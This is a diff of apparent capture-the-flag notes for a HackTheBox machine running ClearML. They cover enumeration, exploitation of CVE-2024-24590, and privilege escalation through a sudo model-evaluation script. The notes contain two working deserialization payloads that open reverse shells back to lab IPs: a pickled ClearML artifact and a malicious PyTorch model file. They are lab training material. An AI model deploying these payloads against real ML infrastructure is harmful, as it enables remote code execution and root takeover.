@@ -15,10 +15,10 @@ PORT   STATE SERVICE
   >>	targetip redirects to app.blurry.htb , blurry.htb not working .
   
 
-- [1] : Clearml 
+- [2] : Clearml 
   >>	login page -> Users : (Chad Jippity , default user , ray flection , Car Melo , e) 
 
-- [2] : clearml-init 
+- [3] : clearml-init 
   >>    configuration on clearml 
   >>	initialized clearml and had to add to dns api and file .
   >>	clearml-server ? clearml-task 
@@ -62,33 +62,54 @@ PORT   STATE SERVICE
  		8TL83TDO2YXCQ4789DE4 	Jun 11 2024 15:42 	blurry 	
 		43JQWWALPYM4QTJG5T6D 	Feb 17 2024 17:54 	149328d8025b
 		```
-- [3] :  
-  >>	
+- [3] :  CVE-2024–24590
+  >>	[https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/]
+  		```python
+		from clearml import Task
+		import pickle, os
+
+		class RunCommand:
+		    def __reduce__(self):
+			return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.x 1234 >/tmp/f',))
+
+		command = RunCommand()
+
+		task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])
+		task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
+		```
+		
 
 
-## Foothold
+## Privesc
 
 
+- [+] : sudo -l
+   >>	sudo /usr/bin/evaluate_model /models/*.pth
+   >>   cat /usr/bin/evaluate_model >> GPT cuz user is jippity xD
+    
+- [+] : privesc way with gpt 
+				import torch
+				import torch.nn as nn
+				import os
 
-- [+] : 
-   >>	
-   
-- [+] : 
-   >>	
-   
-- [+] : 
-   >>	
-   
-- [+] : 
-   >>	
-   
-- [+] : 
-   >>	
-   
-- [+] : 
-   >>	
-   
-- [+] : 
-   >>	
-   
+				class MaliciousModel(nn.Module):
+				    def __init__(self):
+					super(MaliciousModel, self).__init__()
+					self.fc = nn.Linear(10, 1)  # Modify input and output dimensions as needed
+
+				    def forward(self, x):
+					return self.fc(x)
+
+				    def __reduce__(self):
+					# Command to establish reverse shell (replace IP and port with your listener's IP and port)
+					cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.4/5555 0>&1'"
+					return os.system, (cmd,)
+
+				# Instantiate the model
+				malicious_model = MaliciousModel()
+
+				# Save the model using torch.save
+				torch.save(malicious_model, 'malicious_model.pth')
+				
+				
 
